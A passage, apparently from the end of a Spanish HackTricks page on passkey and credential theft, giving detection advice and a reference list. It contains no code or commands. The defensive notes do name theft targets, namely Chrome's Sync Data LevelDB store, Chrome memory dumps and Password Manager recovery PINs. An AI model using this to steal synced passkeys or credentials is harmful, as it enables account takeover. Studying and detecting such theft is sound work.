- Generar alertas ante accesos anómalos a **`Sync Data\LevelDB`** de Chrome por parte de procesos que no sean navegadores.
- Generar alertas ante **volcados de memoria de Chrome** o accesos sospechosos a la memoria entre procesos.
- Investigar solicitudes repetidas del **PIN de recuperación de Google Password Manager** o procesos inesperados de incorporación.
- Tener en cuenta que `signCount` de WebAuthn a menudo no es útil para las passkeys sincronizadas porque puede permanecer constante, por lo que la detección clásica de clones es poco eficaz.

## References

- [1] [Unit 42 – Una investigación sobre años de operaciones no detectadas dirigidas a sectores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing con macro de Word VBA vía SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Dentro de Ink Dragon: revelando la red de retransmisión y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: una nueva superficie de ataque en la autenticación sin contraseña](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / almacenamiento de claves CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Cómo funciona realmente el almacén de datos de Active Directory: dentro de NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Volcado remoto de contraseñas de LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho amplía su arsenal de ciberespionaje con el toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Función CreateFileW y `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Modo de copia de seguridad de Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Preguntas frecuentes de Telegram – finalización de sesiones activas](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard y Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: protección y administración de credenciales](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
